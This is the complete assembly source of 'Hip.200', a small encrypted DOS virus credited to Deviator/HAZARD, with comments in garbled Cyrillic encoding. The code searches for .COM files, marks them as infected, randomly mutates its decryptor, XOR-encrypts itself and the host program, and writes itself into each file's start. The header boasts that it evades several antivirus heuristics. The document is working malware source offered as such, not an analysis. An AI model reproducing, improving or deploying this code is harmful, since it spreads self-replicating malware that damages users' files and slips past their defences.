   ; Hip.200 by Deviator/HAZARD

   ; ”¨ç¨
   ; - ‡ à ¦ ¥â ä ©«ë ¥ áâ ¤ àâ® - ¢¨àãá ¢  ç «¥,  ¦¥àâ¢  ¯®â®¬
   ; - ‘¥¬¨¯®«¨¬®àäë©
   ; - Šà®¬¥ â®£® çâ® á¥¡ï ªà¨¯âã¥â - ¥é¥ ¨ ªà¨¯âã¥â á¢®© ®á¨â¥«ì
   ; - .Exe ¯®¤ ¢¨¤®¬ .Com ¥ § à ¦ ¥â
   ; - ‘®¤¥à¦¨â ¯ïâ¨¡ ©â®¢ë© (c)
   ; - * §¬¥à ¬®¦® ã¬¥ìè¨âì   ¡ ©â

   ; …¢à¨áâ¨ª :
   ; DrWeb ®¡« ¬ë¢ ¥âáï
   ; AVP ®¡« ¬ë¢ ¥âáï
   ; F-PROT âã¤ -¦¥
   ; ...   ¯®ç¥¬ã - ¥§ î ;)

   .model tiny
   .386
   .code
       org 0h
   Hip:    nop                 ; ¬ãá®à
       db  'Z'             ; * è  ¬¥âª  § à ¦¥®áâ¨ = 'Z'
       nop                 ; ¬ãá®à
       mov di,offset DCE+100h          ; * è ¤¥ªà¨¯â®¢è¨ª
       nop                 ; Œãá®à
   LDc:    xor byte ptr ds:[di],00
   DKey    equ $ - 1
       nop                 ; Œãá®à
       inc di
       nop                 ; Œãá®à
       cmp di,0FF00h
       nop
       jb LDc
       nop                 ; Œãá®à
   DCL equ $ - Hip
   DCE:
       push dx ds ds ds di         ; Di = 0FF00h - ¤«ï ¡ã¤ãé¥£® DTA

       mov ax,cs
       add ax,1000h                ; *¨è¨¬ á¥¡ï ¢¢¥àå
       mov es,ax

       mov cx,si
       xor di,di
   rep movsb

       push es
       push offset HEnt            ; “¯à ¢«¥¨¥   ¢¥àåîî ç áâì
       retf

   FMask   db  '*.com',0           ; Œ áª 

   Hent:   push cs cs              ; Ds=Es=Cs
       pop  es ds

       mov ah,1Ah
       pop  dx                 ; Dx = 0FF00h
       int 21h

       mov ah,4Eh
       mov dx,offset FMask         ; * ©¤¥¬ ä ©«
   NFile:  int 21h
       jb AllDone
       mov ax,3d02h
       mov dx,0FF1Eh               ; Žâªà®¥¬ ¥£®
       int 21h
       xchg ax,bx
       mov ah,3Fh
       mov cx,dx               ; —¨â ¥¬ ¥£®
       mov dx,offset VEnd
       int 21h
       mov si,dx
       xor di,di
       cmpsb                   ; ‡ à ¦¥ ?
       cmpsb
       jz CFile
       push ax                 ; * §¬¥à ä ©« 
       xor si,si
       push si

       mov cx,DCL              ; *à®¨§¢®¤¨¬ ¬ãâ æ¨î ¤¥ªà¨¯â®à 
   DoP:    mov al,[si]             ; ‚§ï«¨ ¡ ©â
       cmp al,90h              ; <Nop (90h) ?
       jb  Dz
       cmp al,97h              ; >Xchg ax,di ? (97h)
       ja  Dz
       in al,40h               ; Random
       and al,00000011b            ; Žâ ã«ï ¤® âà¥å
       add al,90h              ; „¥« ¥¬ Xchg ¨«¨ Nop
       mov [si],al             ; *®¬¥áâ¨«¨
   Dz: inc si                  ; á«¥¤. ¡ ©â
       loop DoP

       pop  si

       in al,40h               ; Random
       mov byte ptr DKey,al

       mov di,offset VBz
       push di
       mov cx,VLen             ; Š®¯¨àã¥¬ á¥¡ï ¤«ï ªà¨¯â®¢ª¨
   rep movsb
       mov cx,0FE00h
       mov si,offset VBz+DCL           ; Šà¨¯âã¥¬ á¥¡ï ¨ âãèã
       mov di,si
       mov ah,al
   Enc:    lodsb
       xor al,ah
       stosb
       loop Enc

       mov ax,4200h
       cwd                 ; *   ç «® ä ©« 
       int 21h

       mov ah,40h              ; *¨è¨¬  á ¨ âãèã
       pop dx
       pop cx
       add cx,Vlen
       int 21h

   CFile:  mov ah,3eh              ; ‡ ªàë¢ ¥¬ ä ©«
       int 21h

       mov ah,4Fh              ; ‘«¥¤ãîé¨©
       jmp NFile

       db '!HiP!'              ; (c)

   AllDone:
       pop ds es
       mov di,100h
       push di
       mov si,di
       add si,VLen             ; ‚®ááâ  ¢«¨¢ ¥¬ âãèã
       mov cx,0FE00h
   rep movsb
       retf                    ; *  ¯à®£à ¬¬ã

   VLen    equ offset $ - Hip

       int 20h                 ; *à®áâ®© ®á¨â¥«ì
   VBz db  VLen dup (?)
   VEnd:

   End Hip
